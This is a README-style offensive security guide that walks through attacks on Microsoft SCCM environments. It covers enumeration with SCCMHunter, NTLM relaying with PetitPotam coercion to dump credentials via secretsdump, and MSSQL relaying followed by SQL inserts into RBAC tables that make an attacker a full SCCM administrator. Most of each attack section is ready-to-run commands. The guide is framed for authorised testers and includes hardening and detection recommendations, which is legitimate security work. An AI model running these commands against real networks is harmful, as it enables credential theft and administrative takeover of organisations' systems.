# SCCM-Attacks
Common attacks against SCCM environments for legal offensive security personnel to harden environments.   
I learned these attacks through the amazing public research from [SpecterOps](https://github.com/subat0mik/Misconfiguration-Manager) and [Synacktiv](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial), and I have performed them against several different organizations when I was a consultant.



## Enumerate SCCM Environment
### Requirements: 
- Any domain credentials
- [SCCMHunter](https://github.com/garrettfoster13/sccmhunter/wiki)

### Steps:
1. Enumerate possible SCCM machines  
```python3 sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc-ip>```
2. Gather SCCM roles and check configs such as SMB signing  
```python3 sccmhunter.py smb -u <user> -p <password> -d <domain> -dc-ip <dc-ip> ```
3. Display results  
```python3 sccmhunter.py show -all ```

## SMB Relaying 
[My Step-by-step Youtube Video](https://youtu.be/MM7RpPkMFRs)
### Requirements:
- Any domain credentials
- At least two SCCM servers with ONE having SMB signing set to False
- [PetitPotam](https://github.com/topotam/PetitPotam)
- [Impacket tools](https://www.kali.org/tools/impacket/)
- [Netexec](https://www.kali.org/tools/netexec/)

  
### Steps:
1. Start ntlmrelayx targeting an SCCM server with SMB signing set to false  
```impacket-ntlmrelayx -t "<TARGET IP>" -smb2support –socks```
2. Coerce authentication from an SCCM server to your IP  
```python3 petiPotam.py -u <user> -p <password> <your-ip> <target-ip>```
3. Connect to SMB share through proxychains  
```Proxychains impacket-smbclient <domain>/<user>@<target-ip> -no-pass```
4. Confirm Admin status and dump credentials through proxychains  
```Proxychains impacket-secretsdump <domain>/<user>@<target-ip> -no-pass```
5. Authenticate to other SCCM servers that have SMB signing set to true  
```netexec smb <ip> -u <user> -H :<hash> --shares```

### Recommendations:
- Enforce [SMB signing](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview#policy-locations-for-smb-signing) on all servers and perform frequent auditing
- Monitor for common coerce tools such as PetitPotam using default requests ([Splunk example](https://research.splunk.com/endpoint/95b8061a-0a67-11ec-85ec-acde48001122/)]
- Monitor for credential dump through common tools such as secretsdump


## MSSQL Relaying 
Video Coming Soon
### Requirements:
- Any domain credentials
- At least two SCCM servers with ONE having MSSQL service and [EPA disabled](https://specterops.io/blog/2025/11/25/less-praying-more-relaying-enumerating-epa-enforcement-for-mssql-and-https/)
- [PetitPotam](https://github.com/topotam/PetitPotam)
- [Impacket tools](https://www.kali.org/tools/impacket/)
- [RelayInformer](https://github.com/zyn3rgy/RelayInformer/tree/main/Python)

  
### Steps:
1. Check for EPA disabled or turned off  
```uv run relayinformer mssql --target <TARGET Hostname> --user <domain>/<username> --password <password>```
2. Start ntlmrelayx targeting an SCCM MSSQL Server  
```impacket-ntlmrelayx -t mssql://<TARGET IP> -smb2support –socks```
3. Coerce authentication from an SCCM server (ideally Site Server) to your IP  
```python3 petiPotam.py -u <user> -p <password> <your-ip> <target-ip>```
4. Confirm connection and connect to mssql service through proxychains  
```proxychains impacket-mssqlclient <domain>/<user>@<target-ip> -no-pass -windows-auth```
5. Get user’s SID for SQL commands in Step 5  
```python3 sccmhunter.py mssql -d <domain> -dc-ip <dc ip> -tu <user> -sc <sccm site> -u <user> -p <password>```
6. Add user to RBAC_Admins and query user’s AdminID   
```
use CM_<site_code>

INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (<SID_in_hex_format>,’<domain\user>',0,0,'','','','','<site_code>');

SELECT AdminID,LogonName FROM RBAC_Admins;
```
7. Add user as Full SCCM Administrator *through* mssql connection
```
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00ALL','29');

INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00001','1');

INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00004','1’);
```
_Note: To delete user from database at the end of exploitation run the following (make sure to be in the right database)_
```
delete from RBAC_Admins where AdminID=<AdminID>
```

### Recommendations:
- [Enable EPA](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/connect-to-the-database-engine-using-extended-protection?view=sql-server-ver17#enable-extended-protection-for-the-database-engine) on MSSQL server and perform frequent auditing
- Monitor for common coerce tools such as PetitPotam using default requests ([Splunk example](https://research.splunk.com/endpoint/95b8061a-0a67-11ec-85ec-acde48001122/)]

